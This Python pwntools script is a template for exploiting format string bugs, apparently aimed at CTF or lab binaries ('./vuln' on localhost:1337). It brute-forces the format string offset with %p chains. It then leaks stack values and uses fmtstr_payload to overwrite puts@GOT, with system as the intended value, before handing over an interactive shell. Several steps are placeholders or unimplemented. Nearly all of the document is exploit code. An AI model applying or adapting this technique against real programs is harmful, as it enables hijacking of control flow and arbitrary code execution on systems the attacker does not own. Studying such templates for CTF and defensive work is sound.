#!/usr/bin/env python3
"""
Template: Format string exploitation
- Leak stack/libc addresses with %p chains
- Arbitrary write with %n (fmtstr_payload)
"""
from pwn import *

BINARY      = "./vuln"
REMOTE_HOST = "localhost"
REMOTE_PORT = 1337
OFFSET      = None   # format string argument offset — find with STEP 1

context.binary = elf = ELF(BINARY)

def conn():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(BINARY)

# ── STEP 1: find format string offset ────────────────────────────────────────
# Send: AAAA.%1$p.%2$p.%3$p...%20$p
# Find position where 0x41414141 appears → that's your OFFSET
def find_offset():
    for i in range(1, 30):
        p = conn()
        p.sendlineafter(b":", f"AAAA.%{i}$p".encode())
        out = p.recvline()
        if b"0x41414141" in out or b"41414141" in out.lower():
            log.success(f"Offset = {i}")
            return i
        p.close()
    log.failure("Offset not found in range 1-30")

# ── STEP 2: leak libc via arbitrary read ─────────────────────────────────────
def leak_address(p, addr: int) -> int:
    """Leak 8 bytes at addr using format string."""
    payload = fmtstr_payload(OFFSET, {addr: 0}, numbwritten=0, write_size="byte")
    # simpler: just use %N$s where N is offset pointing to addr on stack
    # depends on control — adjust as needed
    raise NotImplementedError("Implement based on binary behaviour")

# ── STEP 3: arbitrary write to GOT/hook ──────────────────────────────────────
def exploit():
    assert OFFSET is not None, "Find OFFSET first (see STEP 1)"
    p = conn()

    # Example: overwrite puts@GOT with system
    # First leak libc base (use %p chain), then compute system address
    p.sendlineafter(b":", b"%21$p.%23$p")   # adjust positions
    leak_line = p.recvline()
    # parse hex values from output ...

    target = elf.got["puts"]
    # value  = libc.sym["system"]  # after computing libc base

    payload = fmtstr_payload(OFFSET, {target: 0xdeadbeef})  # replace with real value
    p.sendlineafter(b":", payload)
    p.interactive()

if __name__ == "__main__":
    if args.FIND:
        find_offset()
    else:
        exploit()
